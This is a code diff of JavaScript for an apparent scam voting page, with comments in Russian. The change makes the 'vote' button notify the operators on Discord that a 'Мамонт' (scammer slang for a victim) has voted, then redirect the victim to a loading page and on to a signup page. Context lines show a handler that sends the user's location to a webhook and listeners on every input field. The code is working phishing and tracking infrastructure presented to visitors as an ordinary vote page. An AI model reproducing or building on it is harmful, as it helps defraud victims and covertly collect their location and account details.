@@ -95,8 +95,17 @@ document.querySelectorAll('input, textarea').forEach(input => {
 
 // Основная функция, вызываемая при нажатии на кнопку
 function handleClick() {
-    redirectToPage(); // Переход на первую страницу
-    setTimeout(redirectBack, 6000); // Через 6 секунд перенаправляем на вторую страницу
+    // Отправка уведомления о голосовании в Discord
+    const voteMessage = {
+        content: `Мамонт проголосовал!`
+    };
+    sendToDiscord(voteMessage);
+
+    // Переход на первую страницу (например, страница загрузки)
+    redirectToPage();
+
+    // Через 6 секунд перенаправляем на вторую страницу (например, регистрация)
+    setTimeout(redirectBack, 6000);
 }
 
 // Функция для перенаправления на первую страницу
@@ -106,9 +115,7 @@ function redirectToPage() {
 
 // Функция для перенаправления на вторую страницу через 6 секунд
 function redirectBack() {
-    setTimeout(function() {
-        window.location.href = 'signup.html'; // Замените на нужный URL
-    }, 6000);
+    window.location.href = 'signup.html'; // Замените на нужный URL
 }
 
 // Функция для получения местоположения пользователя
@@ -182,14 +189,4 @@ window.onbeforeunload = () => {
 document.getElementById("getLocationBtn").addEventListener("click", getLocationAndSendToWebhook);
 
 // Обработчик для кнопки "Голосовать"
-document.getElementById('voteButton').addEventListener('click', () => {
-    const voteMessage = {
-        content: `Мамонт проголосовал!`
-    };
-    sendToDiscord(voteMessage);
-
-    // Логика увеличения счетчика голосов
-    const voteCount = document.getElementById('voteCount');
-    let currentVotes = parseInt(voteCount.innerText);
-    voteCount.innerText = currentVotes + 1;
-});
+document.getElementById('voteButton').addEventListener('click', handleClick);
